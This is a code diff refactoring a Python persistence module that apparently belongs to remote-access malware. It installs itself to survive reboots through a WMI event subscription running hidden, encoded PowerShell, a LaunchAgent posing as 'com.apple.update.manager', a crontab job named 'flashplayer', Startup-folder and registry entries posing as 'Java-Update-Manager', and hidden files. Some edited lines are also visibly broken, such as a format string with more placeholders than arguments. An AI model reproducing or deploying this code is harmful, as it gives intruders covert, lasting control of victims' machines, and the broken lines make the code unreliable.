@@ -8,6 +8,7 @@ import sys
 import time
 import base64
 import random
+import string
 import subprocess
 
 # packages
@@ -28,16 +29,16 @@ with multiple methods to ensure redundancy
 """
 
 # templates
-__Template_wmi = """$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
+template_wmi = string.Template("""$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
 $filter.QueryLanguage = "WQL"
-$filter.Query = "Select * from __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA [STARTUP]"
-$filter.Name = "[NAME]"
+$filter.Query = "Select * from __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ${STARTUP}"
+$filter.Name = "${NAME}"
 $filter.EventNamespace = 'root\\cimv2'
 $result = $filter.Put()
 $filterPath = $result.Path
 $consumer = ([wmiclass]"\\\\.\\root\\subscription:CommandLineEventConsumer").CreateInstance()
-$consumer.Name = '[NAME]'
-$consumer.CommandLineTemplate = '[COMMAND_LINE]'
+$consumer.Name = '${NAME}'
+$consumer.CommandLineTemplate = '${COMMAND_LINE}'
 $consumer.ExecutablePath = ""
 $consumer.WorkingDirectory = "C:\\Windows\\System32"
 $result = $consumer.Put()
@@ -46,17 +47,17 @@ $bind = ([wmiclass]"\\\\.\\root\\subscription:__FilterToConsumerBinding").Create
 $bind.Filter = $filterPath
 $bind.Consumer = $consumerPath
 $result = $bind.Put()
-$bindPath = $result.Path"""
+$bindPath = $result.Path""")
 
-__Template_plist = """#!/bin/bash
+template_plist = string.Template("""#!/bin/bash
 echo '<plist version="1.0">
 <dict>
 <key>Label</key>
-<string>__LABEL__</string>
+<string>${LABEL}</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/python</string>
-<string>__FILE__</string>
+<string>${FILE}</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
@@ -65,10 +66,10 @@ echo '<plist version="1.0">
 <key>AbandonProcessGroup</key>
 <true/>
 </dict>
-</plist>' > ~/Library/LaunchAgents/__LABEL__.plist
-chmod 600 ~/Library/LaunchAgents/__LABEL__.plist
-launchctl load ~/Library/LaunchAgents/__LABEL__.plist
-exit"""
+</plist>' > ~/Library/LaunchAgents/${LABEL}.plist
+chmod 600 ~/Library/LaunchAgents/${LABEL}.plist
+launchctl load ~/Library/LaunchAgents/${LABEL}.plist
+exit""")
 
 # main
 class Method():
@@ -109,7 +110,7 @@ def _add_hidden_file(value=None):
     try:
         value = sys.argv[0]
         if value and os.path.isfile(value):
-            if os.name is 'nt':
+            if os.name == 'nt':
                 path = value
                 hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
             else:
@@ -130,13 +131,12 @@ def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
             if value and os.path.isfile(value):
                 if not _methods['crontab_job'].established:
                     path = value
-                    user = os.getenv('USERNAME', os.getenv('NAME'))
-                    task = "0 */6 * * * {} {}".format(60/minutes, user, path)
+                    task = "0 * * * * {} {}".format(path)
                     with open('/etc/crontab', 'r') as fp:
                         data = fp.read()
                     if task not in data:
                         with open('/etc/crontab', 'a') as fd:
-                            fd.write('\n' + task + '\n')
+                            fd.write('\n{}\n'.format(task))
                     return (True, path)
                 else:
                     return (True, path)
@@ -146,6 +146,7 @@ def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
 
 def _add_launch_agent(value=None, name='com.apple.update.manager'):
     try:
+        global template_plist
         if sys.platform == 'darwin':
             if not value:
                 if len(sys.argv):
@@ -159,13 +160,12 @@ def _add_launch_agent(value=None, name='com.apple.update.manager'):
                 if not os.path.exists('/var/tmp'):
                     os.makedirs('/var/tmp')
                 fpath = '/var/tmp/.{}.sh'.format(name)
-                bash = globals()['__Template_plist'].replace('__LABEL__', label).replace('__FILE__', value)
+                bash = template_plist.substitute(LABEL=label, FILE=value)
                 with open(fpath, 'w') as fileobj:
                     fileobj.write(bash)
                 bin_sh = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                 time.sleep(1)
-                home = os.environ.get('HOME')
-                launch_agent= '{}/Library/LaunchAgents/{}.plist'.format(home, label)
+                launch_agent= os.path.join(os.environ.get('HOME'), 'Library/LaunchAgents/{}.plist'.format(label))
                 if os.path.isfile(launch_agent):
                     os.remove(fpath)
                     return (True, launch_agent)
@@ -194,7 +194,7 @@ def _add_startup_file(value=None, name='Java-Update-Manager'):
             value = sys.argv[0]
             if value and os.path.isfile(value):
                 appdata = os.path.expandvars("%AppData%")
-                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+                startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                 if not os.path.exists(startup_dir):
                     os.makedirs(startup_dir)
                 startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
@@ -223,11 +223,12 @@ def _add_registry_key(value=None, name='Java-Update-Manager'):
 
 def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
     try:
+        global template_wmi
         if os.name == 'nt' and not _methods['powershell_wmi'].established:
             if command:
                 cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
                 startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-                script = globals()['__Template_wmi'].replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
+                script = template_wmi.substitute(STARTUP=startup, COMMAND_LINE=cmd_line, NAME=name)
                 _ = util.powershell(script)
                 code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
                 result = util.powershell(code)
@@ -252,7 +253,7 @@ def _remove_hidden_file():
             filename = _methods['hidden_file'].result
             if os.path.isfile(filename):
                 try:
-                    unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
+                    unhide  = 'attrib -h {}'.format(filename) if os.name == 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                     if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                         return (False, None)
                 except Exception as e1:
